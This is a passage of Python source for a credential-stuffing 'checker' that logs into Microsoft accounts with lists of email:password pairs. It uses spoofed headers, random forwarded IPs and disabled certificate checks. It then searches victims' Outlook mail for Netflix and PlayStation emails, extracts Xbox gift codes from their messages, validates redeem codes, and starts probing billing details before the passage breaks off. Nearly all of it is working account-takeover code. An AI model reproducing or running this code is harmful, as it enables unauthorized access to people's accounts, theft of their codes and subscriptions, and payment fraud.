                'muid': store_state.get('appContext', {}).get('muid', ''),
                'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
            }
            session.store_state = extracted_values
            return extracted_values
        except: return None

    @staticmethod
    def validate_code(session, code, force_refresh_ids=False):
        try:
            if not code or len(code) < 5 or ' ' in code: return {"status": "INVALID", "message": "Invalid code format"}
            store_state = XboxCodeChecker.get_store_cart_state(session, force_refresh=force_refresh_ids)
            if not store_state:
                store_state = XboxCodeChecker.get_store_cart_state(session, force_refresh=True)
                if not store_state: return {"status": "ERROR", "message": "Failed to get store cart state"}
            token = XboxCodeChecker.get_auth_token(session, force_refresh=force_refresh_ids)
            if not token:
                token = XboxCodeChecker.get_auth_token(session, force_refresh=True)
                if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
            headers = {
                "host": "buynow.production.store-web.dynamics.com",
                "connection": "keep-alive",
                "x-ms-tracking-id": store_state['tracking_id'],
                "sec-ch-ua-platform": "\"Windows\"",
                "authorization": f"WLID1.0=t={token}",
                "x-ms-client-type": "AccountMicrosoftCom",
                "x-ms-market": "US",
                "sec-ch-ua": "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                "ms-cv": store_state['ms_cv'],
                "sec-ch-ua-mobile": "?0",
                "x-ms-reference-id": XboxCodeChecker.generate_reference_id(),
                "x-ms-vector-id": store_state['vector_id'],
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "x-ms-correlation-id": store_state['correlation_id'],
                "content-type": "application/json",
                "x-authorization-muid": store_state['alternative_muid'],
                "accept": "*/*",
                "origin": "https://www.microsoft.com",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.microsoft.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            }
            payload = {
                "market": "US", "language": "en-US", "flights": ["sc_abandonedretry"],
                "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False,
                "buyNowScenario": "redeem", "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
            }
            response = session.post('https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken', headers=headers, json=payload, timeout=30)
            if response.status_code != 200: return {"status": "ERROR", "message": f"HTTP {response.status_code}"}
            data = response.json()
            if "tokenType" in data and data["tokenType"] == "CSV":
                value = data.get("value")
                currency = data.get("currency")
                return {"status": "BALANCE_CODE", "message": f"{code} | {value} {currency}", "product_title": f"Balance Code ({value} {currency})"}
            if "error" in data:
                error = data.get("error", {})
                code_err = error.get("code", "")
                message = error.get("message", "")
                if code_err == "TooManyRequests" or "rate" in message.lower(): return {"status": "RATE_LIMITED", "message": "Rate Limited"}
            if "products" in data and len(data["products"]) > 0:
                 parent_title = ""
                 specific_title = ""
                 for product in data["products"]:
                     p_type = product.get("type", "").lower()
                     title = product.get("title")
                     if not title: title = product.get("sku", {}).get("title")
                     if p_type == "games": parent_title = title
                     elif p_type == "addon" or product.get("kind", "").lower() in ["consumable", "durable", "unmanagedconsumable"]: specific_title = title
                 if not specific_title and len(data["products"]) > 0: specific_title = data["products"][0].get("title", "Unknown Title")
                 final_title = specific_title
                 if parent_title and parent_title != specific_title: final_title = f"{specific_title} | {parent_title}"
                 return {"status": "VALID", "message": f"{code} | {final_title}", "product_title": final_title}
            if "events" in data and "cart" in data["events"]:
                for event in data["events"]["cart"]:
                    reason = event.get("data", {}).get("reason", "")
                    if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                    elif reason == "RedeemTokenExpired": return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                    elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
            return {"status": "INVALID", "message": f"{code} | INVALID"}
        except Exception: return {"status": "ERROR", "message": "Exception"}

def process_account_fetcher(email, password):
    session = create_optimized_session()
    found_codes = []
    try:
        url_post, sft_tag = get_ms_tokens(session)
        if not url_post: return found_codes
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sft_tag}
        res = session.post(url_post, data=data, allow_redirects=True, timeout=15)
        ms_token = None
        if '#' in res.url: ms_token = parse_qs(urlparse(res.url).fragment).get('access_token', [None])[0]
        elif 'cancel?mkt=' in res.text:
            try:
                ipt = re.search('(?<=\"ipt\" value=\").+?(?=\">)', res.text).group()
                pprid = re.search('(?<=\"pprid\" value=\").+?(?=\">)', res.text).group()
                uaid = re.search('(?<=\"uaid\" value=\").+?(?=\">)', res.text).group()
                post_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', res.text).group()
                ret = session.post(post_url, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid}, allow_redirects=True)
                final_redirect = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                fin = session.get(final_redirect, allow_redirects=True)
                ms_token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
            except: pass
        if not ms_token: return found_codes
        xbl_res = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},"RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15)
        if xbl_res.status_code != 200: return found_codes
        xbl_data = xbl_res.json()
        uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']
        user_token = xbl_data['Token']
        xsts_res = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [user_token]},"RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}, timeout=15)
        if xsts_res.status_code != 200: return found_codes
        xsts_token = xsts_res.json()['Token']
        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
        msg_res = session.get("https://xblmessaging.xboxlive.com/network/xbox/users/me/conversations/users/xuid(0)?maxItems=500", headers={"Authorization": auth_header,"x-xbl-contract-version": "1","Accept": "application/json"}, timeout=15)
        if msg_res.status_code != 200: return found_codes
        messages = list(find_all_messages(msg_res.json()))
        for m in messages:
            codes = extract_xbox_codes(m)
            found_codes.extend(codes)
        return found_codes
    except: return found_codes

class SpeedModeChecker:
    def __init__(self):
        self.uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
        ]
        self.timeout = 7

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3:
            return "BAD", []
        for _ in range(3):
            try:
                session = requests.Session()
                session.verify = False
                cid_str = str(uuid.uuid4())
                r_ua = random.choice(self.uas)
                u1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
                h1 = {"X-OneAuth-AppName": "Outlook Lite","X-Office-Version": "3.11.0-minApi24","X-CorrelationId": cid_str,"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)","Host": "odc.officeapps.live.com","Connection": "Keep-Alive"}
                r1 = session.get(u1, headers=h1, timeout=self.timeout)
                if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text: return "BAD", []
                u2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                h2 = {"User-Agent": r_ua, "Connection": "keep-alive"}
                r2 = session.get(u2, headers=h2, allow_redirects=True, timeout=self.timeout)
                um = re.search(r'urlPost":"([^"]+)"', r2.text)
                pm = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
                if not um or not pm: return "BAD", []
                pu = um.group(1).replace("\\/", "/")
                pt = pm.group(1)
                d3 = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={pt}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
                h3 = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": r_ua,"Origin": "https://login.live.com","Referer": r2.url}
                r3 = session.post(pu, data=d3, headers=h3, allow_redirects=False, timeout=self.timeout)
                if "account or password is incorrect" in r3.text or r3.text.count("error") > 0: return "BAD", []
                if "identity/confirm" in r3.text or "Consent" in r3.text or "recover" in r3.text.lower() or "locked" in r3.text.lower(): return "2FA", []
                if "Abuse" in r3.text: return "BAD", []
                lc = r3.headers.get("Location", "")
                cm = re.search(r'code=([^&]+)', lc)
                mc = session.cookies.get("MSPCID", "")
                if not cm or not mc: return "BAD", []
                cd_val = cm.group(1)
                d4 = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={cd_val}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=d4, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout)
                if "access_token" not in r4.text: return "BAD", []
                return "PREMIUM", [f"{email}:{password}"]
            except Exception:
                time.sleep(0.5)
                continue
        return "ERROR", []

class PSNV2Checker:
    def __init__(self):
        self.timeout = 10
    def get_deepl_region(self, text):
        if not text: return "UNKNOWN"
        cleaned_text = text.strip()
        if not cleaned_text: return "UNKNOWN"
        try:
            url = "https://www2.deepl.com/jsonrpc?method=LMT_handle_jobs"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            payload = {"jsonrpc": "2.0", "method": "LMT_split_text", "params": {"texts": [cleaned_text], "commonJobParams": {"mode": "translate"}, "lang": {"lang_user_selected": "auto", "preference": {"weight": {}, "default": "default"}}}, "id": 74080063}
            res = requests.post(url, json=payload, headers=headers, timeout=self.timeout)
            return res.json().get("result", {}).get("lang", {}).get("detected", "UNKNOWN")
        except: return "UNKNOWN"

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3: return "BAD", []
        for attempt in range(2):
            try:
                session = requests.Session()
                session.verify = False
                correlation_id = str(uuid.uuid4())
                url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
                headers1 = {"X-OneAuth-AppName": "Outlook Lite","X-Office-Version": "3.11.0-minApi24","X-CorrelationId": correlation_id,"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)","Host": "odc.officeapps.live.com","Connection": "Keep-Alive"}
                r1 = session.get(url1, headers=headers1, timeout=self.timeout)
                if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text: return "BAD", []
                url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Connection": "keep-alive"}
                r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=self.timeout)
                url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
                ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
                if not url_match or not ppft_match: return "BAD", []
                post_url = url_match.group(1).replace("\\/", "/")
                ppft = ppft_match.group(1)
                login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
                headers3 = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Origin": "https://login.live.com","Referer": r2.url}
                r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=self.timeout)
                if "account or password is incorrect" in r3.text or r3.text.count("error") > 0: return "BAD", []
                if "identity/confirm" in r3.text or "Consent" in r3.text or "recover" in r3.text.lower() or "locked" in r3.text.lower(): return "2FA", []
                if "Abuse" in r3.text: return "BAD", []
                location = r3.headers.get("Location", "")
                code_match = re.search(r'code=([^&]+)', location)
                mspcid = session.cookies.get("MSPCID", "")
                if not code_match or not mspcid: return "BAD", []
                code = code_match.group(1)
                cid = mspcid.upper()
                token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout)
                if "access_token" not in r4.text: return "BAD", []
                access_token = r4.json()["access_token"]
                search_payload1 = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "Central Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Message", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": "sony@email.account.sony.com OR sony@email02.account.sony.com OR sony@email03.account.sony.com"}, "RefiningQueries": None, "Size": 25, "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True, "TopResultsCount": 3}], "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]}, "LogicalId": str(uuid.uuid4())}
                search_headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache","Accept": "application/json", "ForceSync": "false","Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}","Host": "substrate.office.com", "Connection": "Keep-Alive","Accept-Encoding": "gzip", "Content-Type": "application/json"}
                rq1 = requests.post("https://outlook.live.com/searchservice/api/v2/query?n=119&cv=JEZgv2aAWu96fiC2kMifj0.123", json=search_payload1, headers=search_headers, timeout=self.timeout)
                sec = "N/A"
                m1 = re.search(r'"NormalizedSubject":"([^"]+)"', rq1.text)
                if m1: sec = m1.group(1)
                search_payload2 = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "Central Standard Time", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Message", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0, "Query": {"QueryString": "reply@txn-email.playstation.com OR reply@txn-email02.playstation.com OR reply@txn-email03.playstation.com"}, "RefiningQueries": None, "Size": 25, "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3}, {"Field": "Time", "SortDirection": "Desc"}], "EnableTopResults": True, "TopResultsCount": 3}], "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification", "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"]}, "LogicalId": str(uuid.uuid4())}
                rq2 = requests.post("https://outlook.live.com/searchservice/api/v2/query?n=119&cv=JEZgv2aAWu96fiC2kMifj0.123", json=search_payload2, headers=search_headers, timeout=self.timeout)
                orders = 0
                last_msg = "N/A"
                preview = ""
                mt = re.search(r'"Total":(\d+)', rq2.text)
                if mt: orders = int(mt.group(1))
                m2 = re.search(r'"NormalizedSubject":"([^"]+)"', rq2.text)
                if m2: last_msg = m2.group(1)
                m3 = re.search(r'"Preview":"([^"]+)"', rq2.text)
                if m3: preview = m3.group(1)
                if not preview:
                    m4 = re.search(r'"Preview":"([^"]+)"', rq1.text)
                    if m4: preview = m4.group(1)
                region = self.get_deepl_region(preview) if preview else "UNKNOWN"
                if orders > 0:
                    hit_line = f"{email}:{password} | Region = {region} | Security = {sec} | Orders = {orders} | Last Massage = {last_msg}"
                    return "PREMIUM", [hit_line]
                else: return "NO_LINKED", [f"{email}:{password}"]
            except Exception:
                time.sleep(0.5)
                continue
        return "ERROR", []

class NetflixChecker:
    def __init__(self):
        self.email_changed_msgs = ["Your email address has been changed","Ihre E-Mail-Adresse wurde geändert","Votre adresse e-mail a été modifiée","Su dirección decorreo electrónico ha sido cambiada","メールアドレスが変更されました","Vaša e-mail adresa je promijenjena","Ваш адрес электронной почты был изменен","Il tuo indirizzo email è stato modificato","Teie e-posti aadress on muudetud","Correo electrónico cambiado","Адрес электронной почты был изменен","Η διεύθυνση email σας έχει αλλάξει","ที่อยู่อีเมลของคุณถูกเปลี่ยนแล้ว","تم تغيير عنوان بريدك الإلكتروني","تم تغيير البريد الإلكتروني","您的电子邮件地址已更改","تم التغيير"]
        self.sign_in_msgs = ["Netflix: Your sign-in code", "Netflix: Dein Anmeldecode", "Netflix: Votre code d'identification", "Netflix: Tu código de inicio de sesión", "Netflix: Il tuo codice di accesso", "Netflix: Seu código de acesso", "Netflix: رمز تسجيل الدخول الخاص بك", "Netflix: رمز تسجيل الدخول", "Netflix: Ваш код", "Netflix: Ваш код подтверждения", "Netflix: Kod do logowania", "Netflix: O seu código de início de sessão", "Netflix: Din påloggingskode", "Netflix: Din loginkode", "Netflix: كود تسجيل الدخول", "Netflix: サインインコード", "Netflix: 로그인 코드", "Netflix: 您的登录代码", "Netflix: 您的登錄代碼", "Netflix: รหัสเข้าสู่ระบบของคุณ", "Netflix: Twój kod logowania", "Netflix: Giriş kodunuz", "Netflix: Váš přihلاصي kód", "Netflix: Az Ön bejelentkezési kódja"]
        self.welcome_msgs = ["Welcome to Netflix","Willkommen bei Netflix","Bienvenue sur Netflix","Bienvenido a Netflix","Netflixへようこそ","Dobrodošli na Netflix","Добро пожаловать в Netflix","Benvenuto su Netflix","Tere tulemast Netflixi","Καλώς ήρθατε στο Netflix","ยินديต้อนรับสู่ Netflix","مرحبًا بك في Netflix","欢迎来到Netflix"]
        self.welcome_back_msgs = ["Welcome back to Netflix","Willkommen zurück bei Netflix","Bon retour sur Netflix","Bienvenido de nuevo a Netflix","Netflixへようこそ","Dobrodošli nazad na Netflix","С возвращением в Netflix","Bentornato su Netflix","Tere tulemast tagasi Netflixi","Καλώς ήρθατε ξανά στο Netflix","ยินดีต้อนรับกลับสู่ Netflix","مرحبًا بعودتك إلى Netflix","欢迎回到Netflix"]
        self.new_device_msgs = ["A new device is using your account", "Ein neues Gerät verwendet Ihr Konto", "Un nouvel appareil utilise votre compte", "Un nuevo dispositivo está usando su cuenta", "Un nuovo dispositivo sta usando il tuo account", "Um novo aparelho está usando sua conta", "جهاز جديد يستخدم حسابك", "Новое устройство использует вашу учетную запись", "Nowe urządzenie korzysta z Twojego konta", "En ny enhet bruker kontoen din", "En ny enhed bruker din konto", "新しいデバイスがアカウントを使用しています", "새 디바이스에서 회원님의 계정을 사용 중입니다", "有新设备正在使用您的帐户", "有新裝置正在使用您的帳戶", "มีอุปกรณ์ جديدกำลังใช้งานบัญชีของคุณ", "Hesابınızı yeni bir cihaz kullanıyor", "Váš účet používá nové zařízení", "Egy új eszköz használja a fiókját", "Μια νέα συσκευή χρησιμοποιεί τον λογαριασμό σας"]
        self.almost_there_msgs = ["You're almost there", "Sie sind fast am Ziel", "Vous y êtes presque", "¡Ya casi terminas", "¡Ya casi está", "Ci sei quasi", "Quase lá", "Você está quase lá", "لقد أوشكت على الانتهاء", "خطوة واحدة أخيرة", "あともう少しです", "Prawie gotowe", "Neredeyse bitti"]
        self.timeout = 15

    def generate_user_agent(self): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"

    def check_account(self, email, password):
        if "@" not in email or len(password) < 3: return "BAD", []
        email, password = str(email), str(password)
        try:
            for attempts in range(3):
                session = requests.Session()
                ua = self.generate_user_agent()
                client_id = str(uuid.uuid4())
                correct_id = str(uuid.uuid4())
                auth_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+email+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                auth_headers = {"Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "User-Agent": ua, "client-request-id": client_id, "correlation-id": correct_id}
                try:
                    auth_resp = session.get(auth_url, headers=auth_headers, allow_redirects=True, timeout=self.timeout)
                    url = re.search(r'urlPost":"([^"]+)"', auth_resp.text).group(1)
                    ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', auth_resp.text).group(1)
                except Exception: continue
                if not url or not ppft: return "BAD", []
                kuki = session.cookies.get_dict()
                msprequ = kuki.get('MSPRequ')
                uaid = kuki.get('uaid')
                mspok = kuki.get('MSPOK')
                oparams = kuki.get('OParams')
                if not oparams or not mspok or not uaid or not msprequ: continue
                ips = ".".join(str(random.randint(1,300)) for _ in range(4))
                login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&hpgrequestid=&PPFT={ppft}"
                login_headers = {"User-Agent": ua, "Pragma": "no-cache", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Host": "login.live.com", "Connection": "keep-alive", "Content-Length": str(len(login_data)), "Content-Type": "application/x-www-form-urlencoded", "Referer": auth_resp.url, "Cookie": f"MSPRequ={msprequ}; uaid={uaid}; MSPOK={mspok}; OParams={oparams}", "x-forwarded": f"for={ips}; by={ips}", "x-forwarded-for": ips, "x-real-ip": ips, "client-ip": ips}
                try:
                    login_resp = session.post(url, headers=login_headers, data=login_data, allow_redirects=False, timeout=self.timeout)
                    if "OParams" not in login_resp.cookies.get_dict().keys(): continue
                    code_cid = login_resp.headers["Location"].split('code=')[1].split('&')[0]
                except Exception: return "BAD", []
                if code_cid:
                    token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                    token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code_cid, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
                    try:
                        token_resp = session.post(token_url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data=token_data, timeout=self.timeout)
                        access_token = token_resp.json()['access_token']
                    except Exception: return "BAD", []
                else: return "BAD", []
                if access_token:
                    mailbox_id = str(uuid.uuid4())
                    search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
                    search_data = {"Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7", "Scenario": {"Name": "owa.react"},"TimeZone": "United Kingdom Standard Time", "TextDecorations": "Off","EntityRequests": [{"EntityType": "Conversation","ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]}, "From": 0,"Query": {"QueryString": "info@account.netflix.com"},"RefiningQueries": None, "Size": 25,"Sort": [{"Field": "Time", "SortDirection": "Desc"}],"EnableTopResults": True,"TopResultsCount": 3}], "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"}
                    search_headers = {"User-Agent": "Outlook-Android/2.0", "Pragma": "no-cache", "Accept": "application/json", "ForceSync": "false", "Authorization": f"Bearer {access_token}", "X-AnchorMailbox": "CID:" + mailbox_id, "Host": "substrate.office.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
                    try:
                        search_resp = session.post(search_url, headers=search_headers, json=search_data, timeout=self.timeout)
                        text_html = search_resp.text
                    except Exception: return "BAD", []
                    if "info@account.netflix.com" not in text_html: return "BAD", []
                    categories = {"email_changed": self.email_changed_msgs,"free": self.almost_there_msgs,"premium": self.sign_in_msgs + self.welcome_msgs + self.welcome_back_msgs + self.new_device_msgs}
                    earliest_idx = len(text_html)
                    best_category = None
                    for category, msgs in categories.items():
                        for msg in msgs:
                            idx = text_html.find(msg)
                            if idx != -1 and idx < earliest_idx:
                                earliest_idx = idx
                                best_category = category
                    plan_match = re.search(r'(Premium Ultra HD|Standard HD|Basic with Ads|Standard with Ads|Premium|Standard|Basic)', text_html, re.IGNORECASE)
                    if best_category == "email_changed": return "EMAIL_CHG", [f"{email}:{password}"]
                    elif best_category == "free": return "VALID", [f"{email}:{password}"]
                    elif best_category == "premium":
                        hit_msg = f"{email}:{password} | HAS_SUBSCRIPTION = TRUE ✅"
                        if plan_match: hit_msg += f" | Plan = {plan_match.group(1).title()}"
                        return "PREMIUM", [hit_msg]
                    else: return "VALID", [f"{email}:{password}"]
                else: return "BAD", []
            return "BAD", []
        except Exception: return "ERROR", []

class XboxTitanChecker:
    def __init__(self):
        self.session=requests.Session()
        retry_strategy=Retry(total=2,backoff_factor=0.3,status_forcelist=[429,500,502,503,504],allowed_methods=["HEAD","GET","OPTIONS","POST"])
        adapter=HTTPAdapter(max_retries=retry_strategy,pool_connections=100,pool_maxsize=100)
        self.session.mount("http://",adapter);self.session.mount("https://",adapter);self.session.verify=False;self.uuid=str(uuid.uuid4());self.timeout=(5,10)
    def get_days_left(self,date_str):
        try:
            clean_date=date_str.split('T')[0]
            exp_date=datetime.strptime(clean_date,'%Y-%m-%d')
            now=datetime.utcnow()
            days=(exp_date-now).days
            return days if days>0 else 0
        except Exception:
            try:
                exp_date=datetime.fromisoformat(date_str.replace('Z','+00:00')).replace(tzinfo=None)
                now=datetime.utcnow()
                days=(exp_date-now).days
                return days if days>0 else 0
            except Exception:return 0
    def extract_smart_data(self,email,raw_name,raw_country):
        final_name,final_country=raw_name,raw_country
        if not final_name or final_name.lower() in ["unknown","n/a","none"]:
            clean_name=re.sub(r'[0-9_\.\-]',' ',email.split('@')[0]).strip().title();final_name=clean_name if len(clean_name)>2 else "Not Set"
        if not final_country or final_country.lower() in ["unknown","n/a","none"]:
            tld=email.split('.')[-1].upper();final_country=tld if len(tld)==2 else "US"
        return final_name,final_country
    def parse_profile(self,access_token,cid):
        country,name="",""
        headers={"User-Agent":"Outlook-Android/2.0","Authorization":f"Bearer {access_token}","X-AnchorMailbox":f"CID:{cid}","Accept":"application/json"}
        try:
            r=self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",headers=headers,timeout=self.timeout)
            if r.status_code==200:
                data=r.json()
                if "displayName" in data and data["displayName"]:name=data["displayName"]
                elif "name" in data and data["name"]:name=data["name"]
                if "location" in data and data["location"]:
                    loc=data["location"]
                    if isinstance(loc,str):country=loc.split(',')[-1].strip().upper()
                    elif isinstance(loc,dict) and "countryCode" in loc:country=loc["countryCode"].upper()
                if not country and "countryCode" in data:country=data["countryCode"].upper()
        except Exception:pass
        return name,country
    def check_billing(self):
        sub_details,balance,card_type,billing_name,billing_country=[],"$0.0","None","",""
        for attempt in range(2):
            try:
                user_id=str(uuid.uuid4()).replace('-','')[:16]
                state_json=json.dumps({"userId":user_id,"scopeSet":"pidl"})
                payment_auth_url="https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state="+quote(state_json)+"&prompt=none"
